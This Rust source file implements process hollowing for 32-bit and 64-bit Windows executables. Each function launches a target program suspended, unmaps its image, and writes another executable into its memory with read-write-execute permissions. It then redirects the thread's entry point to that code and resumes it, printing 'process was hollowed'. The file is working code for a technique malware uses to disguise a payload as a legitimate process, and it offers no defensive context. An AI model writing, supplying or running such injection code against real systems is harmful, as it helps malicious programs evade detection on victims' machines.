extern crate pe_tools;

use pe_tools::{ shared, x86, x64 };

use anyhow::*;
use winapi::ctypes::c_void;
use ntapi::ntmmapi:: NtUnmapViewOfSection;
use winapi::um::{
    errhandlingapi::{ GetLastError },
    memoryapi::{ VirtualAllocEx, WriteProcessMemory },
    processthreadsapi::{
        CreateProcessA, STARTUPINFOA, PROCESS_INFORMATION, ResumeThread,
        GetThreadContext, SetThreadContext, // SuspendThread
    },
    winbase:: {
        CREATE_SUSPENDED,
        Wow64GetThreadContext, Wow64SetThreadContext
    },
    winnt:: {
        MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
        CONTEXT, WOW64_CONTEXT, CONTEXT_FULL, WOW64_CONTEXT_FULL
    }
};

use std::ffi::CString;
use std::mem::zeroed;
use std::ptr::null_mut;

const STATUS_SUCCESS: i32 = 0x0;

pub fn hollow32(src: impl Into<String>, dest: impl Into<String>) -> Result<()> {
    unsafe {
        // Create dest process
        let mut startup = zeroed::<STARTUPINFOA>();
        let mut process_info = zeroed::<PROCESS_INFORMATION>();

        let dest = CString::new(dest.into()).expect("CString::new failed");
        CreateProcessA(null_mut(), dest.as_ptr() as *mut _, null_mut(), null_mut(), 0, CREATE_SUSPENDED, null_mut(), null_mut(), &mut startup, &mut process_info);

        // Get dest image base address
        let hp = process_info.hProcess;
        let dest_image_base_address = shared::get_remote_image_base_address(hp)?;

        // read src program to memory
        let buffer = shared::get_binary_from_file(src.into())?;
        let mut container = x86::PEContainer::new_from_u8(&buffer, false)?;

        // Unmapping image from dest process
        if NtUnmapViewOfSection(hp, dest_image_base_address as *mut _) != STATUS_SUCCESS {
            bail!("could not unmapping image from dest process. NtUnmapViewOfSection calling was failed.")
        };

        // Allocate memory for src program
        let mut new_dest_image_base_address = VirtualAllocEx(
            hp, dest_image_base_address as *mut _, container.get_optional_headers().windows_fields.size_of_image as usize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
        );

        if new_dest_image_base_address.is_null() {
            new_dest_image_base_address = VirtualAllocEx(
                hp, null_mut(), container.get_optional_headers().windows_fields.size_of_image as usize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
            );
        }

        if new_dest_image_base_address as usize == 0x0 as usize {
            bail!("could not allocate of the remote process image. VirtualAllocEx calling was failed.");
        };

        // change base address to allocated memory address
        container.change_image_base_address(new_dest_image_base_address, false)?;

        // copy headers
        container.remote_copy_headers_to(hp, new_dest_image_base_address)?;

        // copy sectionm headers
        container.remote_copy_section_headers_to(hp, new_dest_image_base_address)?;

        // if need, apply the relocation. if container have the old image base address, will calc delta with that.
        container.remote_delta_relocation(hp, new_dest_image_base_address)?;

        // target's image base address changed, change image base address of remote
        if new_dest_image_base_address != dest_image_base_address {
            WriteProcessMemory(hp, (dest_image_base_address as usize + 0x8) as _, new_dest_image_base_address, std::mem::size_of::<*mut c_void>(), null_mut());
        }

        // create new thread context
        let entry_point = new_dest_image_base_address as usize + container.pe.entry as usize;
        let mut context = zeroed::<WOW64_CONTEXT>();
        context.ContextFlags = WOW64_CONTEXT_FULL;

        if Wow64GetThreadContext(process_info.hThread, &mut context as *mut _) == 0 {
            bail!("could not get thread context: {}", GetLastError());
        }

        // change thread entry point
        context.Eax = entry_point as u32;

        if Wow64SetThreadContext(process_info.hThread, &mut context as *mut _) == 0 {
            bail!("could not set thread context: {}", GetLastError());
        }

        // Resume thread
        if ResumeThread(process_info.hThread) == u32::MAX {
            bail!("could not set thread context: {}", GetLastError());
        }

        // remove debug print
        println!("process was hollowed ε٩(๑> 3 <)۶з");

        return Ok(())
    }
}

pub fn hollow64(src: impl Into<String>, dest: impl Into<String>) -> Result<()> {
    unsafe {
        // Create dest process
        let mut startup = zeroed::<STARTUPINFOA>();
        let mut process_info = zeroed::<PROCESS_INFORMATION>();

        let dest = CString::new(dest.into()).expect("CString::new failed");
        CreateProcessA(null_mut(), dest.as_ptr() as *mut _, null_mut(), null_mut(), 0, CREATE_SUSPENDED, null_mut(), null_mut(), &mut startup, &mut process_info);

        // Get dest image base address
        let hp = process_info.hProcess;
        let dest_image_base_address = shared::get_remote_image_base_address(hp)?;

        // read src program to memory
        let buffer = shared::get_binary_from_file(src.into())?;
        let mut container = x64::PEContainer::new_from_u8(&buffer, false)?;

        // Unmapping image from dest process
        if NtUnmapViewOfSection(hp, dest_image_base_address as *mut _) != STATUS_SUCCESS {
            bail!("could not unmapping image from dest process. NtUnmapViewOfSection calling was failed.")
        };

        // Allocate memory for src program
        let mut new_dest_image_base_address = VirtualAllocEx(
            hp, dest_image_base_address as *mut _, container.get_optional_headers().windows_fields.size_of_image as usize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
        );

        if new_dest_image_base_address.is_null() {
            new_dest_image_base_address = VirtualAllocEx(
                hp, null_mut(), container.get_optional_headers().windows_fields.size_of_image as usize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
            );
        }

        if new_dest_image_base_address as u64 == 0x0 as u64 {
            bail!("could not allocate of the remote process image. VirtualAllocEx calling was failed.");
        };

        // change base address to allocated memory address
        container.change_image_base_address(new_dest_image_base_address, false)?;

        // copy headers
        container.remote_copy_headers_to(hp, new_dest_image_base_address)?;

        // copy sectionm headers
        container.remote_copy_section_headers_to(hp, new_dest_image_base_address)?;

        // if need, apply the relocation. if container have the old image base address, will calc delta with that.
        container.remote_delta_relocation(hp, new_dest_image_base_address)?;

        // target's image base address changed, change image base address of remote
        if new_dest_image_base_address != dest_image_base_address {
            WriteProcessMemory(hp, (dest_image_base_address as u64 + 0x10) as _, new_dest_image_base_address, std::mem::size_of::<*mut c_void>(), null_mut());
        }

        // create new thread context
        let entry_point = new_dest_image_base_address as u64 + container.pe.entry as u64;
        let mut context = zeroed::<CONTEXT>();
        context.ContextFlags = CONTEXT_FULL;

        if GetThreadContext(process_info.hThread, &mut context as *mut _) == 0 {
            bail!("could not get thread context: {}", GetLastError());
        }

        // change thread entry point
        context.Rcx = entry_point;

        if SetThreadContext(process_info.hThread, &mut context as *mut _) == 0 {
            bail!("could not set thread context: {}", GetLastError());
        }

        // Resume thread
        if ResumeThread(process_info.hThread) == u32::MAX {
            bail!("could not set thread context: {}", GetLastError());
        }

        // remove debug print
        println!("process was hollowed ε٩(๑> 3 <)۶з");

        Ok(())
    }
}
